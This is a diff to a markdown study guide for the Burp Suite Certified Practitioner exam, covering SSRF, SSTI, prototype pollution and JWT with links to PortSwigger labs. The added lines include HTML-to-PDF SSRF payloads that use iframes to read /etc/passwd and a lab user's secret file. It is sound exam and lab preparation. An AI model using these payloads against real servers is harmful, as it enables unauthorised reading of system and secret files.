@@ -12,6 +12,7 @@ Maybe we can use the acronym BSCP, like OSCP  :)
 [SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
 [SSTI Server side template injection](#ssti---server-side-template-injection)  
 [Prototype pollution](#prototype-pollution)  
+[JSON Web Tokens](#jwt)  
 
 
 ## Cross Site Scripting
@@ -584,6 +585,14 @@ Content-Length: 0
 
 ### HTML to PDF  
 
+>Identify file download HTML-to-PDF convert function on target is vulnerable.  
+
+```JavaScript
+<script>
+	document.write('<iframe src=file:///etc/passwd></iframe>');
+</script>
+```  
+
 >Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
 [PortSwigger Research HTML-to-PDF converters vuln to SSRF](https://portswigger.net/daily-swig/html-to-pdf-converters-open-to-denial-of-service-ssrf-directory-traversal-attacks)
@@ -605,19 +614,29 @@ Content-Length: 0
 </html>
 ```  
 
+>JSON POST request body containing the HTMLtoPDF formatted payload to read local file.  
+
+```JSON
+{
+	"tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
+}
+```  
+
 >Random notes on HTML-to-PDF converters & SSRF  
 
 ```
 "Download report as PDF"
 /adminpanel/save-report/
 POST request - Body JSON 
-{ "tableHtml":"........<html code snip>......."}
+{ 
+	"tableHtml":"........<html code snip>......."
+}
 
 pdf creator: wkhtmltopdf 0.12.5
 hacktricks xss cross site scripting server side xss dynamic pdf 
 ```  
 
-<sup> SSRF Section incomplete due to insuffiecient testing...</sup>  
+<sup> SSRF Section incomplete ...need more input...</sup>  
 
 
 ## SSTI - Server Side Template Injection
@@ -668,7 +687,7 @@ portswigger.net/research/server-side-template-injection
 portswigger.net/research/template-injection
 ```  
 
-<sup> SSTI Section incomplete as it required practical proof and screenshot evidence of practice...</sup>  
+<sup> SSTI Section incomplete ...need more input...</sup>  
 
 
 ## ProtoType Pollution  
@@ -685,7 +704,7 @@ portswigger.net/research/template-injection
 
 [PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
 
-<sup> Proto pollution section is incomplete ...</sup>  
+<sup> Proto pollution section is incomplete ...need more input...</sup>  
 
 
 ## JWT  
@@ -699,7 +718,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4
 
 [PortSwigger Lab: JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)  
 
-<sup> JWT section incomplete ...</sup>  
+<sup> JWT section ...need more input...</sup>  
 
 
 [My YouTube Exam Study Music Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YlA_fNwv4_tQAYYkIMfY5NY)  
